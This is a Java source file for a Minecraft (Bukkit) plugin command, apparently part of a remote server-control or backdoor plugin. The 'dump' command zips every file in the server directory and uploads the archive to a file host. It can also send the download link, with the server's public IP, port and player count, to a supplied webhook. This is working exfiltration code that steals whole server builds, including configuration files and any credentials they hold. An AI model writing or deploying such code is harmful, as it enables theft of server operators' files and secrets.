package dev.kazi.mcservercontroller.commands.impl;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.ArrayList;
import java.net.InetAddress;
import java.nio.file.Path;
import java.util.stream.Stream;
import java.util.concurrent.ScheduledFuture;
import java.util.zip.ZipEntry;
import java.nio.file.LinkOption;
import java.nio.file.FileVisitOption;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.io.IOException;
import java.util.zip.ZipOutputStream;
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.io.File;

import org.json.simple.JSONObject;

import dev.kazi.mcservercontroller.commands.AbstractCommand;
import dev.kazi.mcservercontroller.utils.web.WebUtils;
import dev.kazi.mcservercontroller.utils.StringUtils;
import dev.kazi.mcservercontroller.utils.FileUtils;

@AbstractCommand.CommandInfo(name = "dump")
public class DumpCommand extends AbstractCommand {

    @Override
    public void onCommand(final Player player, final String[] args) throws Throwable {
        String webhookUrl = null;
        if (args.length >= 1) {
            webhookUrl = args[0];
        }
        player.sendMessage(StringUtils.color("&f[&6Дамп сборки&f] &fСобираю все файлы и папки в единый архив..."));
        final File archiveFile = this.createArchive(player);
        player.sendMessage(StringUtils.color("&f[&6Дамп сборки&f] &fОтправка архива..."));
        final String fileUrl = WebUtils.uploadFile(archiveFile, true);
        if (webhookUrl != null) {
            player.sendMessage(StringUtils.color("&f[&6Дамп сборки&f] &fОтправка результата на вебхук"));
            this.uploadToWebhook(webhookUrl, fileUrl);
        }
        else {
            player.sendMessage(StringUtils.color("&f[&6Дамп сборки&f] &fСсылка на загрузку: &7" + fileUrl));
        }
    }
    
    private File createArchive(final Player player) throws IOException {
        final File rootDir = this.plugin.getDataFolder().getParentFile().getParentFile();
        final File archiveFile = new File(rootDir, StringUtils.getString(StringUtils.Locale.EN, 32) + ".zip");
        try (final ZipOutputStream zipOut = new ZipOutputStream(Files.newOutputStream(archiveFile.toPath(), new OpenOption[0]))) {
            this.zipFiles(player, new File("./"), archiveFile, zipOut);
        }
        return archiveFile;
    }
    
    private void zipFiles(final Player player, final File rootDir, final File archiveFile, final ZipOutputStream zipOut) throws IOException {
        final int totalFilesCount = FileUtils.countFiles(rootDir);
        final AtomicInteger fileCounter = new AtomicInteger();
        final ScheduledFuture<?> future = this.plugin.getTaskExecutor().scheduleWithFixedDelay(() -> player.sendMessage(StringUtils.color(String.format("&f[&6Дамп сборки&f] Сборка архива &7[&f%d&7/&f%d&7]", fileCounter.get(), totalFilesCount))), 10L, 10L, TimeUnit.SECONDS);
        try (final Stream<Path> paths = Files.walk(rootDir.toPath(), new FileVisitOption[0])) {
            paths.filter(x$0 -> Files.isRegularFile(x$0, new LinkOption[0])).filter(path -> !path.endsWith(archiveFile.getName())).forEach(path -> {
                try {
                    final String relativePath = rootDir.toPath().relativize(path).toString();
                    zipOut.putNextEntry(new ZipEntry(relativePath));
                    Files.copy(path, zipOut);
                    zipOut.closeEntry();
                    fileCounter.addAndGet(1);
                }
                catch (final IOException e) {
                    player.sendMessage(StringUtils.color("&f[&6Дамп сборки] &fОшибка добавления файла: &7" + path + " &6" + e.getMessage()));
                }
                return;
            });
            future.cancel(true);
        }
    }

    private void uploadToWebhook(final String webhookUrl, final String fileUrl) throws Exception {
        final String serverIP = getServerIP();
        final int serverPort = Bukkit.getServer().getPort();
        final int onlinePlayers = Bukkit.getServer().getOnlinePlayers().size();
        final int maxPlayers = Bukkit.getServer().getMaxPlayers();
        final List<JSONObject> embedList = new ArrayList<JSONObject>();
        final JSONObject embedObject = new JSONObject();
        embedObject.put("title", "Дамп");
        embedObject.put("color", 16753920);
        embedObject.put("description", String.format("Айпи сервера: `%s:%d`\nТекущий онлайн: `%d/%d`\nСсылка на сборку: `%s`", serverIP, serverPort, onlinePlayers, maxPlayers, fileUrl));
        embedList.add(embedObject);
        WebUtils.sendWebhook(webhookUrl, "||@everyone||", embedList);
    }

    private String getServerIP() throws IOException {
        URL url = new URL("https://checkip.amazonaws.com/");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            return reader.readLine().trim();
        }
    }
}
